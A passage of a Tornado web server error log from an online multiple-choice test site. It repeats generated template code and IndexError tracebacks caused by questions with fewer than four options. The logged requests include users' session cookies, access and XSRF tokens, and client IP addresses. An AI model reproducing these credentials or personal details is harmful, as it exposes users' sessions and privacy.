 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b761b8e4c85480ff4f8cb&answers=%5B1%5D&cursor=11&_xsrf=a72480ac9f38491c987036314331c9cd', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.157.50.23', 'Cookie': '_xsrf=a72480ac9f38491c987036314331c9cd; access_token="QUFBRzZsTmNzNkdjQkFKc3JoeDR1MldtTVpDYjdDWkF0bDUwY1h5QXo0eWVVc1pCNG9wT3VnNmVpaVdScW5KcTZndEZoQkJiZ2JqZkdEWWYxbHlJbTkyZVFPN0ZQY2txemhRS0hDVXJEd1pEWkQ=|1348171239|39abdb21e6e442130e704c9fc2cf37a9e637d8da"; __utma=188782963.286415293.1347962953.1347962953.1348171171.2; __utmb=188782963.5.10.1348171171; __utmc=188782963; __utmz=188782963.1347962953.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 91.36ms
WARNING:root:404 GET /h (127.0.0.1) 0.72ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b94c78e4c8548017fb42d&answers=%5B3%5D&cursor=14&_xsrf=3bfc475aa7374634934261809a7091dc', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '188.221.121.90', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDUFViOU5wZEVaQWw2ckh4TUxZSFpCUmtTWkNVMDExT3Rubnd2Ylg5RUZtaGpFazF6OGU4ZFpCUEF4dERhQ0s5RnJPb1pCVXV2cWlHMm52SVNuOVpCYTJiSmZCOW85UVpEWkQ=|1347963440|2bf665d3a726f0b5aa3e9cdda0e0690b59617c1e"; _xsrf=3bfc475aa7374634934261809a7091dc; __utma=188782963.2116357284.1347963424.1348165950.1348178970.3; __utmb=188782963.6.10.1348178970; __utmc=188782963; __utmz=188782963.1347963424.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 33.28ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b94c78e4c8548017fb42d&answers=%5B3%5D&cursor=14&_xsrf=3bfc475aa7374634934261809a7091dc', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '188.221.121.90', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFDUFViOU5wZEVaQWw2ckh4TUxZSFpCUmtTWkNVMDExT3Rubnd2Ylg5RUZtaGpFazF6OGU4ZFpCUEF4dERhQ0s5RnJPb1pCVXV2cWlHMm52SVNuOVpCYTJiSmZCOW85UVpEWkQ=|1347963440|2bf665d3a726f0b5aa3e9cdda0e0690b59617c1e"; _xsrf=3bfc475aa7374634934261809a7091dc; __utma=188782963.2116357284.1347963424.1348165950.1348178970.3; __utmb=188782963.6.10.1348178970; __utmc=188782963; __utmz=188782963.1347963424.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
